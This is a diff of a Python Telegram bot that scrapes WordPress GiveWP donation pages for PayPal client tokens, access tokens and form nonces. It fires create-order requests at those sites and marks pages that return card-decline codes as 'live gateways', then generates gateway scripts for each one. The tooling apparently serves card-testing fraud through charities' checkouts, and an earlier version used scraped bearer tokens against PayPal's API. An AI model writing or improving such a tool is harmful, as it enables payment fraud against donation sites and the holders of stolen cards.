@@ -162,7 +162,10 @@ def ali_al2(massege):
 
         result = check_link(link)
         
-        if 'error' in result and not result.get('au') and not result.get('id_form2'):
+        respons = result.get('respons', '')
+        is_live = ('Order ID' in respons) or ('PayPal Response' in respons) or result.get('order_id')
+        
+        if not is_live:
             bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Reason:</b> {result.get('error', 'Unknown')}", parse_mode="HTML")
             return
 
@@ -170,7 +173,6 @@ def ali_al2(massege):
         id_form2 = result['id_form2']
         nonec = result['nonec']
         au = result['au']
-        respons = result.get('respons', 'Live')
 
     except Exception as e:
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
@@ -463,7 +465,7 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص PayPal Commerce - يقبل أي رد فعلي"""
+    """فحص PayPal Commerce - فحص دفع فعلي مع ردود PayPal API"""
     try:
         if not link.startswith(("http://", "https://")):
             return {'link': link, 'error': 'Invalid URL'}
@@ -486,7 +488,7 @@ def check_link(link):
 
         res = r.text
         
-        # ============ البحث عن client token ============
+        # ============ البحث عن client token و accessToken ============
         enc = None
         au = None
         
@@ -496,7 +498,6 @@ def check_link(link):
             r'client-token=["\']([^"\']+)["\']',
             r'client_token=["\']([^"\']+)["\']',
             r'clientToken=["\']([^"\']+)["\']',
-            r'"clientToken"\s*:\s*"([^"]+)"',
         ]
         
         for pattern in client_patterns:
@@ -511,7 +512,6 @@ def check_link(link):
             r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
             r'accessToken=([^&\s"\']+)',
             r'access_token=([^&\s"\']+)',
-            r'"access_token"\s*:\s*"([^"]+)"',
         ]
         
         for pattern in au_patterns:
@@ -580,10 +580,6 @@ def check_link(link):
                         nonec = value
         
         # ============ الفحص الفعلي ============
-        order_id = ''
-        response_text = ''
-        
-        # محاولة 1: GiveWP create order
         if id_form2 and nonec:
             try:
                 parsed = urlparse(link)
@@ -610,114 +606,77 @@ def check_link(link):
                 headers['content-type'] = data.content_type
                 params = {'action': 'give_paypal_commerce_create_order'}
                 
-                response = session.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=20, verify=False)
+                response = session.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=30, verify=False)
                 
-                response_text = response.text[:200]
+                response_text = response.text
                 
+                # ردود PayPal API المعروفة = شغال
+                paypal_responses = [
+                    'Payer cannot pay',
+                    'INSUFFICIENT_FUNDS',
+                    'ORDER_NOT_APPROVED',
+                    'TRANSACTION_REFUSED',
+                    'PAYER_ACTION_REQUIRED',
+                    'INSTRUMENT_DECLINED',
+                    'CREDIT_CARD_REFUSED',
+                    'CARD_DECLINED',
+                    'PAYMENT_DENIED',
+                    'PAYER_CANNOT_PAY',
+                    'EXPIRED_CREDIT_CARD',
+                    'INVALID_PAYMENT_METHOD',
+                    'FRAUD_FILTERS',
+                    'RISK_FILTERS',
+                ]
+                
+                # ردود الخطأ = ميت
+                dead_responses = [
+                    'invalid_client',
+                    'Client Authentication failed',
+                    'invalid_grant',
+                ]
+                
+                # Order ID = حي
                 try:
                     order_id = response.json()['data']['id']
-                except:
-                    try:
-                        error_data = response.json()
-                        if 'data' in error_data and error_data['data']:
-                            response_text = str(error_data['data'])[:200]
-                    except:
-                        pass
-            except:
-                pass
-        
-        # محاولة 2: PayPal API مباشر
-        if not order_id and au:
-            try:
-                headers = {
-                    'authorization': f'Bearer {au}',
-                    'content-type': 'application/json',
-                    'user-agent': 'Mozilla/5.0',
-                }
-                
-                json_data = {
-                    'intent': 'CAPTURE',
-                    'purchase_units': [{
-                        'amount': {
-                            'currency_code': 'USD',
-                            'value': '1.00'
+                    if order_id:
+                        return {
+                            'link': link,
+                            'id_form1': id_form1 or id_form2,
+                            'id_form2': id_form2,
+                            'nonec': nonec,
+                            'au': au or '',
+                            'respons': f'Order ID: {order_id}',
+                            'order_id': order_id
                         }
-                    }]
-                }
-                
-                response = session.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=json_data, timeout=20, verify=False)
-                
-                response_text = response.text[:200]
-                
-                try:
-                    order_id = response.json()['id']
                 except:
                     pass
-            except:
-                pass
+                
+                # PayPal Response = حي
+                for pr in paypal_responses:
+                    if pr.lower() in response_text.lower():
+                        return {
+                            'link': link,
+                            'id_form1': id_form1 or id_form2,
+                            'id_form2': id_form2,
+                            'nonec': nonec,
+                            'au': au or '',
+                            'respons': f'PayPal Response: {pr}',
+                            'order_id': ''
+                        }
+                
+                # Dead Response = ميت
+                for dr in dead_responses:
+                    if dr.lower() in response_text.lower():
+                        return {'link': link, 'error': dr}
+                
+                # لو الرد مش معروف بس فيه error = ميت
+                if 'error' in response_text.lower():
+                    return {'link': link, 'error': 'Error response'}
+                
+            except Exception as e:
+                return {'link': link, 'error': f'Failed: {str(e)[:100]}'}
         
-        # ============ القبول ============
-        # Order ID = حي 100%
-        if order_id:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': au,
-                'respons': f'Order ID: {order_id}',
-                'order_id': order_id
-            }
-        
-        # au + form fields = حي
-        if au and id_form2 and nonec:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': au,
-                'respons': 'Live (au + form)',
-                'order_id': ''
-            }
-        
-        # رد فعلي من الموقع = حي
-        if response_text and len(response_text) > 10:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': au or '',
-                'respons': f'Response: {response_text[:100]}',
-                'order_id': ''
-            }
-        
-        # au بس = حي
-        if au:
-            return {
-                'link': link,
-                'id_form1': '',
-                'id_form2': '',
-                'nonec': '',
-                'au': au,
-                'respons': 'Live (au)',
-                'order_id': ''
-            }
-        
-        # form fields بس = حي
-        if id_form2 and nonec:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': '',
-                'respons': 'Live (form)',
-                'order_id': ''
-            }
-        
-        return {'link': link, 'error': 'No PayPal data'}
+        return {'link': link, 'error': 'No form fields'}
     except Exception as e:
         return {'link': link, 'error': str(e)[:100]}
 
@@ -809,26 +768,24 @@ def process_bulk_file(message):
             with progress['lock']:
                 progress['processed'] += 1
                 
+                respons = result.get('respons', '')
                 is_live = (
-                    result.get('au') or 
-                    result.get('order_id') or 
-                    result.get('id_form2') or 
-                    'Response:' in result.get('respons', '') or
-                    'Order ID' in result.get('respons', '') or
-                    'Live' in result.get('respons', '')
+                    'Order ID' in respons or
+                    'PayPal Response' in respons or
+                    result.get('order_id')
                 )
                 
                 if is_live:
                     progress['live'] += 1
                     live_idx = progress['live']
-                    progress['current_respons'] = result.get('respons', 'Live')
+                    progress['current_respons'] = respons
                     
                     try:
                         code = generate_gateway_code(result, live_idx, file_num)
                         file_name = f'gateway_{live_idx}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
-                        caption = f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n📦 <b>Gateway Data:</b>\n<code>id_form1: {result['id_form1']}\nid_form2: {result['id_form2']}\nnonec: {result['nonec']}\nau: {result['au']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result.get('respons', 'Live')}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr"""
+                        caption = f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n📦 <b>Gateway Data:</b>\n<code>id_form1: {result['id_form1']}\nid_form2: {result['id_form2']}\nnonec: {result['nonec']}\nau: {result['au']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{respons}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr"""
                         send_queue.put((chat_id, file_name, caption))
                     except Exception as e:
                         print(f"Error preparing file: {e}")
